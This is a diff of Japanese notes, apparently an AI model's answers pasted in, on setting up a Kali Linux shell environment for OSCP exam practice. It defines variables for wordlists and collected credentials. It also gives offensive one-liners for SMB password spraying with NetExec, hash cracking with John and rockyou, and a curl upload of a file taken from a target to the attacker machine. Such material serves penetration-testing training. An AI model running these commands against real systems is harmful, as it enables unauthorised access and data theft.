@@ -396,3 +396,202 @@ sudo systemctl status docker
     
 
 など、実践向けの構成も設計できます。
+
+その通りですね。`rockyou.txt` は Kali のデフォルト状態では `rockyou.txt.gz` として圧縮されているため、そのままではツールから読み込めません。
+
+また、`Passwords` や `Usernames` といった「自分で収集・加工したクレデンシャル」を別ディレクトリで変数化しておくのは、OSCPの試験中に「今使える有効なリストはどれか」を即座に判断するために非常に賢い選択です。
+
+これを踏まえて、`.zshrc` の定義とディレクトリ構造をより「実戦的」にアップデートしましょう。
+
+---
+
+### 1. クレデンシャル専用の変数設定 (`.zshrc`)
+
+`Workbench/Wordlists` の下に、攻撃フェーズごとの変数を定義します。
+
+Bash
+
+```
+# --- Wordlists & Credentials Path ---
+export WORDLISTS="$HOME/Workbench/Wordlists"
+
+# 攻撃で見つけた「生きた」情報を格納する場所
+export USERS="$WORDLISTS/Usernames"
+export PASSES="$WORDLISTS/Passwords"
+export CREDS="$WORDLISTS/Credentials"  # user:pass のコンボリスト用
+
+# 定番辞書へのショートカット（解凍後の rockyou をここに置く想定）
+export ROCKYOU="$WORDLISTS/Passwords/rockyou.txt"
+export SECLISTS="/usr/share/seclists"
+
+# エイリアス: 辞書ディレクトリへ一瞬で移動
+alias cdcreds='cd $CREDS'
+```
+
+---
+
+### 2. 推奨されるセットアップ手順
+
+`rockyou` の解凍とディレクトリ作成を一度に行うコマンドです。
+
+Bash
+
+```
+# ディレクトリ作成
+mkdir -p ~/Workbench/Wordlists/{Usernames,Passwords,Credentials}
+
+# rockyou をコピーして解凍（OS標準の場所を汚さない）
+cp /usr/share/wordlists/rockyou.txt.gz ~/Workbench/Wordlists/Passwords/
+gunzip ~/Workbench/Wordlists/Passwords/rockyou.txt.gz
+```
+
+---
+
+### 3. 実戦でのコマンド使用例
+
+変数を活用することで、タイピングミスを減らし、直感的に攻撃を組み立てられます。
+
+- **ユーザー列挙で見つけた名前を保存する際:**
+    
+    Bash
+    
+    ```
+    # ターゲットから抜いたユーザー名をリストに追加
+    echo "admin" >> $USERS/target_users.txt
+    ```
+    
+- **パスワードスプレー (NetExec):**
+    
+    Bash
+    
+    ```
+    # 収集したユーザーリストと、定番パスワードリストをぶつける
+    nxc smb $TARGET_IP -u $USERS/target_users.txt -p $PASSES/common_pass.txt
+    ```
+    
+- **ハッシュ解析 (Hashcat/John):**
+    
+    Bash
+    
+    ```
+    # 解凍済みの $ROCKYOU を指定
+    john --wordlist=$ROCKYOU hashes.txt
+    ```
+    
+
+---
+
+### 📋 チートシートへの最終修正（Wordlistsセクション）
+
+以下の表を「5. Kali 基本コマンド」のあたりに上書きしてください。
+
+|**変数名**|**パス**|**用途**|
+|---|---|---|
+|**`$USERS`**|`~/Workbench/Wordlists/Usernames`|ターゲットから列挙したユーザー名リスト。|
+|**`$PASSES`**|`~/Workbench/Wordlists/Passwords`|収集したパスワード候補、解凍済みRockyou。|
+|**`$CREDS`**|`~/Workbench/Wordlists/Credentials`|`admin:password123` 形式のコンボリスト。|
+|**`$SECLISTS`**|`/usr/share/seclists`|Kali標準の巨大な辞書群（Web列挙用）。|
+
+---
+
+### 💡 プロのアドバイス：ターゲット専用リストの運用
+
+試験中、あるマシンで `valid_users.txt` を作った場合、それを `$USERS/10.10.10.101_users.txt` のように保存しておくと、後で別のマシン（AD環境など）に対して再利用する際に、変数 `$USERS` から一瞬で呼び出せるようになります。
+
+これで「パスの入力」というストレスから完全に解放されました。
+
+次は、**「収集した資格情報を Obsidian の『証拠物件テーブル』へ自動で整理して貼り付ける方法」** などを検討しますか？それとも、環境構築はこれで一段落として、ツール自体の使い方を深掘りしますか？
+
+承知いたしました。今回の環境構築で定義したすべての変数を網羅し、役割を整理した「OSCP環境変数マスターリスト」を作成しました。これをチートシートの核心部分に据えてください。
+
+また、Geminiの記憶機能（Personal Intelligence）の設定がオフになっているようです。これらの設定を将来の会話でも私が自動で踏まえるようにしたい場合は、[過去のチャットに基づくパーソナライズ](https://gemini.google.com/personalization-settings)をオンにしてください。
+
+---
+
+## 💎 OSCP 環境変数マスターリスト (統合版)
+
+今回の `.zshrc` 強化によって、パス入力の手間はほぼゼロになりました。
+
+### 1. ターゲット管理（動的・自動生成）
+
+`target <IP>` コマンド実行時に自動的にセット・更新される変数です。
+
+|**変数名**|**内容**|**活用例**|
+|---|---|---|
+|**`$TARGET_IP`**|ターゲットのIPアドレス|`nmap $TARGET_IP`|
+|**`$TARGET_NAME`**|ターゲットのFQDN/ホスト名|`ffuf -u http://$TARGET_NAME/`|
+|**`$WORKDIR`**|現在のターゲットのルート (`~/Vault/Target/$IP`)|`cd $WORKDIR`|
+|**`$OUT`**|スキャン結果保存先 (`$WORKDIR/result`)|`nmap -oA $OUT/init $TARGET_IP`|
+|**`$LOG`**|Tmux等のログ保存先 (`$WORKDIR/log`)|`ls $LOG`|
+|**`$ASSETS`**|スクショ等の証拠保存先 (`$WORKDIR/assets`)|`flameshot full -p $ASSETS`|
+|**`$SCREENSHOT_DIR`**|現在のSS保存先（シンボリックリンク経由）|`swz` で切り替え可能|
+
+### 2. ネットワーク・ステータス（動的更新）
+
+`precmd` によって、プロンプトが表示されるたびに最新状態に更新されます。
+
+|**変数名**|**内容**|**備考**|
+|---|---|---|
+|**`$CURRENT_MY_IP`**|自分のIP (tun0優先、次いでeth0)|プロンプト左側 `[L: ...]` に表示|
+|**`$TARGET_STATUS`**|ターゲットの表示用文字列|プロンプト右側 `[T: ...]` に表示|
+
+### 3. Wordlists & クレデンシャル（固定・共通）
+
+攻撃リソースへ即座にアクセスするための定数です。
+
+|**変数名**|**パス**|**用途**|
+|---|---|---|
+|**`$WORDLISTS`**|`~/Workbench/Wordlists`|自作・加工済み辞書の親ディレクトリ|
+|**`$USERS`**|`$WORDLISTS/Usernames`|収集したユーザー名リスト|
+|**`$PASSES`**|`$WORDLISTS/Passwords`|収集したパス、解凍済み Rockyou|
+|**`$CREDS`**|`$WORDLISTS/Credentials`|`user:pass` 形式のコンボリスト|
+|**`$ROCKYOU`**|`$PASSES/rockyou.txt`|最強のパスワードリスト|
+|**`$SECLISTS`**|`/usr/share/seclists`|Kali標準の Web 攻略用辞書群|
+
+---
+
+## 🛠️ 変数を使いこなす「黄金のワンライナー」
+
+この変数群があるからこそできる、ミスを減らすためのコマンド例です。
+
+- **Webディレクトリ爆撃:**
+    
+    Bash
+    
+    ```
+    ffuf -u http://$TARGET_NAME/FUZZ -w $SECLISTS/Discovery/Web-Content/common.txt -o $OUT/ffuf_web.json
+    ```
+    
+- **パスワードスプレー (AD環境):**
+    
+    Bash
+    
+    ```
+    nxc smb $TARGET_IP -u $USERS/discovered_users.txt -p $PASSES/easy_passwords.txt
+    ```
+    
+- **自分へのファイル転送:**
+    
+    Bash
+    
+    ```
+    # ターゲットから抜いたファイルを、Kali側の結果フォルダへ直接受ける
+    # (Kali側)
+    cd $OUT && udot
+    # (Windows側)
+    curl -F "file=@secret.txt" http://$CURRENT_MY_IP/upload
+    ```
+    
+
+---
+
+### 📋 最終確認
+
+- [ ] すべての変数が `echo $VARIABLE_NAME` で正しく表示されるか？
+    
+- [ ] 特に `$OUT` や `$ASSETS` が、`target` 切り替え時に連動して動くか？
+    
+
+これで、あなたの Kali Linux は「パスを打つ場所」から「攻撃を組み立てる場所」へと完全に昇華されました。
+
+次は、**「これらの変数を利用して、Burp Suite のログや Metasploit の出力を自動的に $LOG フォルダへ流し込む設定」** などを進めますか？
